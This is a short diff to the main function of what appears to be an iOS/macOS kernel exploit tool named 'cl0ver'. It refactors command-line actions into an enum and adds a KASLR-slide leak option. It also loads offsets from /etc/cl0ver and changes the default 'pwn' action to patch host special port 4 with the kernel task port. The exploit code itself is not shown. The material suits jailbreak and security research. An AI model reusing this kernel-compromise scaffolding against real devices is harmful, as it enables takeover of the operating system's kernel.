@@ -4,6 +4,18 @@
 #include "common.h"             // ASSERT, WARN, log_init, log_release, sanity
 #include "exploit.h"            // dump_kernel, exploit, panic_leak
 #include "io.h"                 // OSData, OSString
+#include "offsets.h"            // off_cfg
+#include "slide.h"              // get_kernel_slide
+
+#define CONFIG_PATH "/etc/cl0ver"
+
+enum
+{
+    actPwn,
+    actPanic,
+    actDump,
+    actSlide,
+};
 
 int main(int argc, const char **argv)
 {
@@ -17,17 +29,21 @@ int main(int argc, const char **argv)
 
     // 8,4 ffffff80044ef1f0 S __ZTV8OSString
 
-    int action = 0;
+    int action = actPwn;
     size_t off;
     for(off = 1; off < argc; ++off)
     {
         if(strcmp(argv[off], "panic") == 0)
         {
-            action = 1;
+            action = actPanic;
         }
         else if(strcmp(argv[off], "dump") == 0)
         {
-            action = 2;
+            action = actDump;
+        }
+        else if(strcmp(argv[off], "slide") == 0)
+        {
+            action = actSlide;
         }
         else
         {
@@ -50,18 +66,26 @@ int main(int argc, const char **argv)
     }
 
     sanity();
+    off_cfg(CONFIG_PATH);
 
     switch(action)
     {
-        case 1:
+        case actPanic:
             panic_leak();
             break;
-        case 2:
+        case actDump:
             dump_kernel("kernel.bin");
             break;
-        default:
-            exploit();
+        case actSlide:
+            get_kernel_slide();
             break;
+        case actPwn:
+            //exploit(CONFIG_PATH);
+            patch_host_special_port_4(get_kernel_task(CONFIG_PATH));
+            break;
+        default:
+            WARN("This should never happen");
+            return 1;
     }
 
     log_release();
